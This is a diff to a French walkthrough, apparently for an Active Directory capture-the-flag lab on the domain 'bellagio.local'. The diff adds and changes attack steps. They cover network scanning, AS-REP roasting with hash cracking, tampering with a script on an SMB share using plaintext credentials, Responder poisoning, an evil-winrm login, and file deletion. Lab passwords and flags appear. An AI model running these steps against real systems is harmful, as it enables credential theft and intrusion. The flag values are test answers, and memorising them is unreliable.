@@ -14,7 +14,7 @@ lancer un nmap pour que la personne connaissent son réseaux qui répondent
 nmap -Pn -p- -sV -sC 10.1.1.1/24
 nmap -Pn -n -sS -vv --reason --packet-trace 10.1.1.1
 
-nxc smb "10.1.1.1"
+nxc smb "10.1.1.0/24"
 ```
 
 -Pn: Skip host discovery (treat all hosts as online).
@@ -61,7 +61,12 @@ Attaque :
 
 => L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.
 
+Créer un fichier users_list.txt avec le compte trouvé
+
 ```powershell
+
+nano users_list.txt
+
 GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.1.1.1" "bellagio.local/"
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -103,6 +108,13 @@ smbclient //10.1.1.1/script -U 'bellagio\svc-bella%P@ssw0rd'
 
 get 111_script_smb.ps1
 
+exit
+
+nano 111_script_smb.ps1
+
+smbclient //10.1.1.1/script -U 'bellagio\svc-bella%P@ssw0rd'
+
+put 111_script_smb.ps1
 ```
 
 Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1
@@ -113,10 +125,12 @@ Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèren
 
 responder -I wg0
 
+hashcat -m 5600 user.txt pass.txt
+
 ```
 
 
-Flag : Administrator123
+Flag : P@ssw0rd
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -136,11 +150,14 @@ L'utilisateur se doit de créer un compte admin local grace a son droit de chang
 Exemple de script : 
 
 ```shell
-    evil-winrm -i IP_X.X.X.X -u "$USER" -p "$PASSWOR"
+    evil-winrm -i 10.1.2.2 -u "svc-winrm" -p "Administrator123"
+cd "C:/script/"
+
+   download "C:/script/script_task_log.ps1"
 ```
 
 ```shell
-    rm 
+    rm "C:/script/script_task_log.ps1" -force
 ```
 
 
